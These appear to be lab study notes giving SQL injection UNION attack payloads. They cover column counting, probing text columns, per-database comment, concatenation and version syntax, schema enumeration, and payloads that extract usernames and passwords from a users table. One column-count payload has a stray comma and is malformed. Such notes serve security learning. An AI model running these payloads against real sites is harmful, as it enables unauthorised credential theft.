# SQL Injection - UNION Attacks

## 1. Determine Number of Columns

### Method A: ORDER BY

``` 
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
``` 

Increment until error. Last number before error = column count.

### Method B: UNION SELECT NULL

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL,--
' UNION SELECT NULL,NULL,NULL--
```

Increment until no error. Number of NULLs = column count.

## 2. Find Columns That Accept Text

```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

Probe each column. If no error and the string appears in output, that column accepts text.

## 3. Comment Syntax by Database

| Database | Comment |
| - | - |
| MySQL | `#` or `-- ` (requires trailing space) |
| PostgreSQL | `--` |
| Oracle |  `--` |
| Microsoft SQL Server | `--` |

> **Lesson learned:** In Burp Repeater, `#` is more reliable for MySQL. `--` without a trailing space caused HTTP 500 in multiple labs.

## 4. String Concatenation by Database

| Database | Operator/Function |
| - | - |
| Oracle | `'a' \|\| 'b' ` |
| PostgreSQL | `'a' \|\| 'b'` |
| MySQL | `CONCAT('a','b')` or `'a' 'b'` (space) |
| Microsoft SQL Server | `'a' + 'b'` |

## 5. Database Version Query

| Database | Query |
| - | - |
| MySQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| Oracle | `SELECT banner FROM v$version` |
| Microsoft SQL Server | `SELECT @@version` |

## 6. List All Tables (Non-Oracle)

```
SELECT table_schema, table_name FROM information_schema.tables
```

## 7. List Columns of a Specific Table

```
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'
```

## 8. Extract Data from a Single Column (Concatenation)

When only one column accepts text:
```
' UNION SELECT NULL, CONCAT(username,'~',password) FROM users--
```

The `NULL` fills the non-text column. The concatenation packs multiple values into the one text column.

## 9. Extract Data from Multiple Columns

When two columns accept text:
```
' UNION SELECT username, password FROM users--
```

## 10. Quick Reference: PostgreSQL System Tables (Exclude from Enumeration)

These are internal PostgreSQL tables - **not** user tables:
- `pg_stat_user_indexes`
- `pg_auth_members`
- `pg_user_mappings`

If you see `roleid.oid`, `admin_option.boolean`, etc., you're looking at a system table. Move on.